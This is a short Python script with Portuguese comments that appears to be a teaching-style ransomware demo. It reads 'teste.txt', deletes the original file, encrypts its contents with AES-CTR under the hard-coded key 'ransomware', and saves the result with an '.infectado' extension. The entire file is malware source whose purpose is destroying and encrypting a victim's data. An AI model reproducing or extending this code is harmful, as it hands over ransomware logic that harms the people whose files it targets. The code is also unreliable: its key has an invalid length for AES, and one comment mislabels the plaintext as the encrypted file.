import os
import pyaes

## Abrir o arquivo criptografado
file_name = "teste.txt"
##abre o arquivo com o texto do file_name
file = open(file_name, "rb")
##Lê o arquivo
file_data = file.read()
file.close()

##remove o arquivo do sistema operaciona
os.remove(file_name)

##criar uma chave de criptografia
key= b"ransomware"
aes = pyaes.AESModeOfOperationCTR(key)

##criptografar o arquivo
crypto_data = aes.encrypt(file_data)

##apaga e insere o arquivo criptografado no lugar

new_file = file_name + ".infectado"
## escreve arquivo encriptado no novo arquivo
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()